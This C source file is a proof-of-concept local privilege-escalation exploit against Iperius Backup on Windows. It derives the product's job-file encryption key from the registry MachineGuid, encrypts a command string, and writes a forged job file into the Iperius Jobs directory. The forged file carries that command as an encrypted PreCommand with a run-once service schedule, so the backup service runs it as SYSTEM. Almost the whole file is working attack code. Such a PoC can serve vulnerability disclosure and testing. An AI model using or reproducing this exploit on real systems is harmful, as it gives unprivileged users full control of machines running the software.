#include <windows.h>
#include <stdio.h>
#include <time.h>
#include <bcrypt.h>
#include <wincrypt.h>
#include <string.h>

#pragma comment(lib, "bcrypt.lib")
#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "advapi32.lib")

#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#define DELPHI_UNIX_DIFF 25569.0
#define SECONDS_IN_DAY 86400.0

// ----------------------------------------------------------------
// Delphi TDateTime and Timestamp Generation (Timezone-Aware)
// ----------------------------------------------------------------
void GetDelphiDate(char* buffer, size_t size) {
    time_t now = time(NULL);
    struct tm ltm;
    localtime_s(&ltm, &now);
    // Convert local time struct back to epoch seconds as if it were UTC,
    // producing a value offset by the local timezone — matching Delphi TDateTime behavior
    time_t localSeconds = _mkgmtime(&ltm);
    if (localSeconds == -1) {
        localSeconds = now; // Fallback to UTC
    }
    double unixDays = (double)localSeconds / SECONDS_IN_DAY;
    double delphiDate = unixDays + DELPHI_UNIX_DIFF;
    char temp[64];
    sprintf_s(temp, sizeof(temp), "%.15g", delphiDate);
    // Replace decimal separator with colon (Iperius format)
    for (int i = 0; temp[i] != '\0'; i++) {
        if (temp[i] == '.' || temp[i] == ',') {
            temp[i] = ':';
            break;
        }
    }
    strcpy_s(buffer, size, temp);
}

void GetTimestamp(char* buffer, size_t size) {
    time_t now = time(NULL);
    struct tm t;
    localtime_s(&t, &now);
    strftime(buffer, size, "%Y%m%d%H%M%S", &t);
}

// ----------------------------------------------------------------
// Cryptography (MachineGuid -> AES-128 ECB)
// ----------------------------------------------------------------

// Replace '=' with '&#61;' for XML/INI compatibility
void ReplaceEquals(char* str) {
    char buffer[4096] = { 0 };
    char* src = str;
    char* dst = buffer;
    while (*src) {
        if (*src == '=') {
            strcpy_s(dst, 6, "&#61;");
            dst += 5;
        } else {
            *dst++ = *src;
        }
        src++;
    }
    *dst = '\0';
    strcpy_s(str, 4096, buffer);
}

// Read MachineGuid from the registry (accessible to all local users)
BOOL GetMachineGuidLE(wchar_t* outBuffer, DWORD bufferSize) {
    HKEY hKey;
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE,
        L"SOFTWARE\\Microsoft\\Cryptography",
        0, KEY_READ | KEY_WOW64_64KEY, &hKey) != ERROR_SUCCESS)
        return FALSE;
    DWORD size = bufferSize * sizeof(wchar_t);
    if (RegQueryValueExW(hKey, L"MachineGuid", NULL, NULL,
        (LPBYTE)outBuffer, &size) != ERROR_SUCCESS) {
        RegCloseKey(hKey);
        return FALSE;
    }
    RegCloseKey(hKey);
    return TRUE;
}

// Reverse a wide string in-place
void ReverseStringW(wchar_t* str) {
    int len = (int)wcslen(str);
    for (int i = 0; i < len / 2; i++) {
        wchar_t temp = str[i];
        str[i] = str[len - 1 - i];
        str[len - 1 - i] = temp;
    }
}

// Encrypt a command string using the MachineGuid-derived AES-128 ECB key
BOOL GenerateEncryptedCommand(const wchar_t* plaintext,
    char* outBuffer, size_t outSize) {
    BCRYPT_ALG_HANDLE hHashAlg = NULL, hAesAlg = NULL;
    BCRYPT_HASH_HANDLE hHash = NULL;
    BCRYPT_KEY_HANDLE hKey = NULL;
    BYTE key[16];
    wchar_t guid[256] = { 0 };
    wchar_t keyString[512] = { 0 };
    BOOL result = FALSE;
    PBYTE pbKeyObject = NULL, pBuffer = NULL, pbCipherText = NULL;
    char* pszBase64 = NULL;

    if (!GetMachineGuidLE(guid, 256)) return FALSE;

    // Key derivation: reverse GUID, prepend 'X', append '1'
    ReverseStringW(guid);
    swprintf_s(keyString, 512, L"X%s1", guid);

    // 1. SHA-256 hash of key material
    if (!NT_SUCCESS(BCryptOpenAlgorithmProvider(
        &hHashAlg, BCRYPT_SHA256_ALGORITHM, NULL, 0)))
        goto cleanup;
    DWORD cbHashObj = 0, cbData = 0;
    BCryptGetProperty(hHashAlg, BCRYPT_OBJECT_LENGTH,
        (PBYTE)&cbHashObj, sizeof(DWORD), &cbData, 0);
    PBYTE pbHashObj = (PBYTE)HeapAlloc(GetProcessHeap(), 0, cbHashObj);
    if (!NT_SUCCESS(BCryptCreateHash(hHashAlg, &hHash,
        pbHashObj, cbHashObj, NULL, 0, 0))) {
        HeapFree(GetProcessHeap(), 0, pbHashObj);
        goto cleanup;
    }
    BCryptHashData(hHash, (PBYTE)keyString,
        (ULONG)(wcslen(keyString) * sizeof(wchar_t)), 0);
    BYTE fullHash[32];
    BCryptFinishHash(hHash, fullHash, 32, 0);
    // Take first 16 bytes as AES-128 key
    memcpy(key, fullHash, 16);
    HeapFree(GetProcessHeap(), 0, pbHashObj);

    // 2. AES-128 ECB setup
    if (!NT_SUCCESS(BCryptOpenAlgorithmProvider(
        &hAesAlg, BCRYPT_AES_ALGORITHM, NULL, 0)))
        goto cleanup;
    BCryptSetProperty(hAesAlg, BCRYPT_CHAINING_MODE,
        (PBYTE)BCRYPT_CHAIN_MODE_ECB,
        sizeof(BCRYPT_CHAIN_MODE_ECB), 0);
    DWORD cbKeyObj = 0;
    BCryptGetProperty(hAesAlg, BCRYPT_OBJECT_LENGTH,
        (PBYTE)&cbKeyObj, sizeof(DWORD), &cbData, 0);
    pbKeyObject = (PBYTE)HeapAlloc(GetProcessHeap(), 0, cbKeyObj);
    if (!NT_SUCCESS(BCryptGenerateSymmetricKey(hAesAlg, &hKey,
        pbKeyObject, cbKeyObj, key, 16, 0)))
        goto cleanup;

    // 3. Prepare plaintext data (UTF-16LE + PKCS#7 padding)
    DWORD plainByteLen = (DWORD)(wcslen(plaintext) * sizeof(wchar_t));
    DWORD paddingLen = 16 - (plainByteLen % 16);
    DWORD totalLen = plainByteLen + paddingLen;
    pBuffer = (PBYTE)HeapAlloc(GetProcessHeap(),
        HEAP_ZERO_MEMORY, totalLen);
    memcpy(pBuffer, plaintext, plainByteLen);
    for (DWORD i = 0; i < paddingLen; i++)
        pBuffer[plainByteLen + i] = (BYTE)paddingLen;

    // 4. Encrypt
    DWORD cbCipher = 0;
    BCryptEncrypt(hKey, pBuffer, totalLen, NULL, NULL, 0,
        NULL, 0, &cbCipher, 0);
    pbCipherText = (PBYTE)HeapAlloc(GetProcessHeap(), 0, cbCipher);
    if (!NT_SUCCESS(BCryptEncrypt(hKey, pBuffer, totalLen, NULL,
        NULL, 0, pbCipherText, cbCipher, &cbCipher, 0)))
        goto cleanup;

    // 5. Base64 encode and replace '=' for INI compatibility
    DWORD cbBase64 = 0;
    CryptBinaryToStringA(pbCipherText, cbCipher,
        CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, NULL, &cbBase64);
    pszBase64 = (char*)HeapAlloc(GetProcessHeap(), 0, cbBase64);
    CryptBinaryToStringA(pbCipherText, cbCipher,
        CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF,
        pszBase64, &cbBase64);
    ReplaceEquals(pszBase64);
    strcpy_s(outBuffer, outSize, pszBase64);
    result = TRUE;

cleanup:
    if (hHash) BCryptDestroyHash(hHash);
    if (hKey) BCryptDestroyKey(hKey);
    if (hHashAlg) BCryptCloseAlgorithmProvider(hHashAlg, 0);
    if (hAesAlg) BCryptCloseAlgorithmProvider(hAesAlg, 0);
    if (pbKeyObject) HeapFree(GetProcessHeap(), 0, pbKeyObject);
    if (pBuffer) HeapFree(GetProcessHeap(), 0, pBuffer);
    if (pbCipherText) HeapFree(GetProcessHeap(), 0, pbCipherText);
    if (pszBase64) HeapFree(GetProcessHeap(), 0, pszBase64);
    return result;
}

// ----------------------------------------------------------------
// Job File Generator — writes directly to the Jobs directory
// ----------------------------------------------------------------
int main() {
    // Output path: directly into the Iperius Jobs directory
    const char* filename = "C:\\ProgramData\\IperiusBackup\\Jobs\\Job321.ibj";
    const wchar_t* payload = L"cmd ";  // Command to execute as SYSTEM

    FILE* fp;
    if (fopen_s(&fp, filename, "w") != 0) {
        printf("Failed to create file.\n");
        return 1;
    }

    char delphiDate[64];
    char timestamp[64];
    char encryptedCmd[256];

    // Generate dynamic timestamps
    GetDelphiDate(delphiDate, sizeof(delphiDate));
    GetTimestamp(timestamp, sizeof(timestamp));

    if (!GenerateEncryptedCommand(payload,
        encryptedCmd, sizeof(encryptedCmd))) {
        printf("Failed to encrypt command. Ensure MachineGuid is accessible.\n");
        strcpy_s(encryptedCmd, sizeof(encryptedCmd), "");
    } else {
        printf("Payload encrypted successfully: %s\n", encryptedCmd);
        printf("Local Delphi Date generated: %s\n", delphiDate);
    }

    // Write the complete .ibj configuration file
    fprintf(fp, "\n[HEADER]\n");
    fprintf(fp, "NAME=POC.exe\n");
    fprintf(fp, "wt=1\n");
    fprintf(fp, "LastChangeUser=poc\n");
    fprintf(fp, "LastChangeTime=%s\n", "46049:0000000000");
    fprintf(fp, "LastStartPID=14508\n");
    fprintf(fp, "LastProcessStart=%s\n", "46049:0000000000");
    fprintf(fp, "LastStart=%s\n", "46049:0000000000");
    fprintf(fp, "LastStartTimestamp=%s\n", timestamp);
    fprintf(fp, "CurrentJobOperation=\n");
    fprintf(fp, "LastBackupSize=0\n");
    fprintf(fp, "LastBackupProcFiles=0\n");
    fprintf(fp, "LastEnd=%s\n", "46049:0000000000");
    fprintf(fp, "LastEndTimestamp=%s\n", timestamp);
    fprintf(fp, "LastResult=0\n");
    fprintf(fp, "[SETTINGS]\n");
    fprintf(fp, "IncludeHiddenFiles=0\n");
    fprintf(fp, "IncludeSystemFiles=0\n");
    fprintf(fp, "IncludeSJR=1\n");
    fprintf(fp, "IncludeLockedFiles=1\n");
    fprintf(fp, "CreateLogFile=1\n");
    fprintf(fp, "LogFileSimpleText=0\n");
    fprintf(fp, "AllFilesInTheLog=0\n");
    fprintf(fp, "FileErrorsWarningsLimit=1\n");
    fprintf(fp, "ShowBackupStatus=1\n");
    fprintf(fp, "StatusWindow=1\n");
    fprintf(fp, "ShowTrayBalloon=0\n");
    fprintf(fp, "Shutdown=0\n");
    fprintf(fp, "ExcludeFromWebReporting=0\n");
    fprintf(fp, "NoWarningsIfNull=0\n");
    fprintf(fp, "NoErrorsMovDelFiles=0\n");
    fprintf(fp, "ZipMoreComp=0\n");
    fprintf(fp, "CopyFileDateTimeNormalCopy=0\n");
    fprintf(fp, "FatFileTimeAdjustNormalCopy=0\n");
    fprintf(fp, "FileCompareMethodNormalCopy=0\n");
    fprintf(fp, "GetAllFilesToZipFromShadowCopy=0\n");
    fprintf(fp, "[MAIL_NOTIF_OPTIONS]\n");
    fprintf(fp, "Enabled=0\n");
    fprintf(fp, "Subject={BACKUP_RESULT} - {JOB_NAME} - Iperius Backup\n");
    fprintf(fp, "Recipients=\n");
    fprintf(fp, "RecipientsBCC=\n");
    fprintf(fp, "Account=\n");
    fprintf(fp, "AttachJobConfigFile=0\n");
    fprintf(fp, "AttachLogFile=0\n");
    fprintf(fp, "SendToBCConlyOnError=0\n");
    fprintf(fp, "[MAIL_NOTIF_SEND_CONDITIONS]\n");
    fprintf(fp, "Always=1\n");
    fprintf(fp, "Success=0\n");
    fprintf(fp, "Warnings=0\n");
    fprintf(fp, "Errors=0\n");
    fprintf(fp, "AtLeastOneFileCopied=0\n");
    fprintf(fp, "NoFileCopied=0\n");
    fprintf(fp, "UserAbort=0\n");
    fprintf(fp, "BackupSize=\n");
    fprintf(fp, "BackupDuration=\n");
    fprintf(fp, "EachInterval=\n");
    fprintf(fp, "ExecTypeManual=0\n");
    fprintf(fp, "ExecTypeSched=0\n");
    fprintf(fp, "NumBackupsAfterLastMailReportSent=15\n");
    fprintf(fp, "[PRE_POST_COMMANDS]\n");
    fprintf(fp, "RunOtherJobPre=\n");
    fprintf(fp, "RunOtherJobPost=\n");
    // Inject the encrypted command payload
    fprintf(fp, "PreCommand=%s\n", encryptedCmd);
    fprintf(fp, "PreWaitForCompletion=0\n");
    fprintf(fp, "PreCommandWaitSeconds=180\n");
    fprintf(fp, "PreCommandRunHide=0\n");
    fprintf(fp, "PostCommand=\n");
    fprintf(fp, "PostWaitForCompletion=0\n");
    fprintf(fp, "PostCommandWaitSeconds=180\n");
    fprintf(fp, "PostCommandRunHide=0\n");
    fprintf(fp, "[POST_COMMAND_CONDITIONS]\n");
    fprintf(fp, "Always=1\n");
    fprintf(fp, "Success=0\n");
    fprintf(fp, "Warnings=0\n");
    fprintf(fp, "Errors=0\n");
    fprintf(fp, "AtLeastOneFileCopied=0\n");
    fprintf(fp, "NoFileCopied=0\n");
    fprintf(fp, "UserAbort=0\n");
    fprintf(fp, "BackupSize=\n");
    fprintf(fp, "BackupDuration=\n");
    fprintf(fp, "ExecTypeManual=0\n");
    fprintf(fp, "ExecTypeSched=0\n");
    fprintf(fp, "[SCHEDULING]\n");
    fprintf(fp, "SchedType=0\n");
    fprintf(fp, "WeekDays=\n");
    fprintf(fp, "MonthDays=\n");
    fprintf(fp, "WeekDayNumInTheMonth=1,1\n");
    fprintf(fp, "EachInterval=0,0,0\n");
    fprintf(fp, "OneTime=\n");
    fprintf(fp, "RunOnceAsServiceDateTime=%s\n", delphiDate);
    fprintf(fp, "Times=\n");
    fprintf(fp, "LastSetLocally=%s\n", "46049:0000000000");
    fprintf(fp, "[ITEM|FILE|]\n");
    fprintf(fp, "Included=1\n");
    fprintf(fp, "NetworkAuthAccount=\n");
    fprintf(fp, "SyncPermissions=0\n");
    fprintf(fp, "RecreateItemPath=1\n");
    fprintf(fp, "[DEST|FOLDER|]\n");
    fprintf(fp, "Included=1\n");
    fprintf(fp, "BackupType=1\n");
    fprintf(fp, "NumCopies=1\n");
    fprintf(fp, "ZipCompr=0\n");
    fprintf(fp, "ZipSetPwd=0\n");
    fprintf(fp, "ZipPassword=\n");
    fprintf(fp, "ZipProtectionMode=0\n");
    fprintf(fp, "CustomZipFileName=\n");
    fprintf(fp, "CompressItemsIndividually=0\n");
    fprintf(fp, "StorePath=2\n");
    fprintf(fp, "Sync=0\n");
    fprintf(fp, "AlwaysRemoveEmptyFoldersNormalCopy=0\n");
    fprintf(fp, "DoNotCreateEmptyFolders=1\n");
    fprintf(fp, "UseMultiThread=0\n");
    fprintf(fp, "CreateInfoFileForAutoRestore=1\n");
    fprintf(fp, "RootFolderJobName=1\n");
    fprintf(fp, "CustomRootFolderName=\n");
    fprintf(fp, "NetworkAuthAccount=\n");
    fprintf(fp, "EjectRemovableDrive=0\n");
    fprintf(fp, "NewFullDayOfTheWeek=\n");
    fprintf(fp, "NumDaysIncDiffRecycleBin=0\n");
    fclose(fp);

    printf("File %s created successfully.\n", filename);
    return 0;
}
